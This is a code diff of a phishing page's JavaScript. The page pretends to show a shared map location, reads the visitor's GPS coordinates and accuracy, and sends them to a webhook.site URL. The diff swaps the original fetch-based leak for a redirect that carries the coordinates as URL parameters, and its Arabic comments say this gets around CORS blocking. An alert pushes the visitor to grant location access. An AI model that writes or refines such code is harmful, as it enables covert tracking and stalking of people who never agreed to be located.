@@ -33,14 +33,11 @@
             const lon = position.coords.longitude;
             const acc = position.coords.accuracy;
             
-            // Exfiltrate to webhook receiver
-            fetch('https://webhook.site/dc1260ff-ab41-4424-a6e9-e521640ef9e8', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc })
-            }).then(() => {
-                window.location.href = "https://maps.google.com";
-            });
+            // إرسال الإحداثيات مباشرة عبر بارامترات الرابط لتفادي حظر CORS
+            const targetUrl = `https://webhook.site/dc1260ff-ab41-4424-a6e9-e521640ef9e8?lat=${lat}&lon=${lon}&acc=${acc}`;
+            
+            // التوجيه إلى رابط الاستقبال لتسجيل البيانات، ثم الانتقال لخرائط جوجل
+            window.location.href = targetUrl;
         }
         function showError(error) {
             alert("Location access required to view shared point.");
